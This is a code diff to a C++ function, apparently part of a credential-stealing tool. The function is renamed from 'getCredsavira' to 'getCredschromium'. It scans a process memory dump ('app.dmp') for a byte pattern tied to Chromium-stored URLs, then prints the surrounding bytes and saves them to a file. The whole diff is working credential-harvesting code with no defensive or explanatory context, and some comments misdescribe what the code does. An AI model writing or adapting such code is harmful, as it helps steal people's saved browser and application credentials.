@@ -3,9 +3,10 @@
 #include <fstream>
 #include <vector>
 #include <string>
+#include <sstream>
 #include "../core/saveFile.h"
 
-int getCredsavira() {
+int getCredschromium() {
     std::ifstream file("app.dmp", std::ios::binary);
 
     if (!file.is_open()) {
@@ -13,40 +14,41 @@ int getCredsavira() {
         return 1;
     }
 
-    std::vector<unsigned char> searchPattern = { 0x21, 0x6a, 0x19, 0x00, 0x19, 0x02, 0x00, 0x00, 0x19, 0x02, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x8d, 0x05, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00 };
-    std::vector<unsigned char> foundData;
+    // Specify your search pattern here
+    std::vector<unsigned char> searchPattern = { 0x20, 0x2D, 0x20, 0x68, 0x74, 0x74, 0x70, 0x73, 0x20, 0x77, 0x00 };
+
+    // Initialize variables to count consecutive spaces
+    int consecutiveSpaces = 0;
 
     while (!file.eof()) {
         unsigned char c;
         file.read(reinterpret_cast<char*>(&c), sizeof(c));
 
-        if (c == searchPattern[foundData.size()]) {
-            foundData.push_back(c);
-            if (foundData.size() == searchPattern.size()) {
-                // We found the search pattern, now collect data until reaching the 600 data limit
-                std::vector<unsigned char> extractedData;
-                int dataCount = 0;
+        // Check if the character matches the search pattern
+        if (c == searchPattern[consecutiveSpaces]) {
+            consecutiveSpaces++;
 
-                while (dataCount < 600 && !file.eof()) {
-                    file.read(reinterpret_cast<char*>(&c), sizeof(c));
-                    extractedData.push_back(c);
-                    dataCount++;
-                }
+            if (consecutiveSpaces == searchPattern.size()) {
+                // Pattern found, rewind to collect the 100 characters before the pattern
+                std::vector<unsigned char> buffer(100, 0);
 
-                // Convert the binary data to a UTF-8 string
-                std::string utf8ExtractedData(extractedData.begin(), extractedData.end());
+                file.seekg(-static_cast<int>(buffer.size()), std::ios::cur);
+                file.read(reinterpret_cast<char*>(buffer.data()), buffer.size());
 
-                // Print the extracted UTF-8 string
-                std::cout << "Pattern Data: " + utf8ExtractedData << std::endl;
+                // Convert the buffer to a UTF-8 string
+                std::string utf8Data(buffer.begin(), buffer.end());
+
+                // Print the UTF-8 string
+                std::cout << "Pattern Data: " + utf8Data << std::endl;
 
                 //Save into file
-                saveFile(utf8ExtractedData);
+                saveFile(utf8Data);
 
-                foundData.clear();
+                consecutiveSpaces = 0;
             }
         }
         else {
-            foundData.clear();
+            consecutiveSpaces = 0;
         }
     }
 
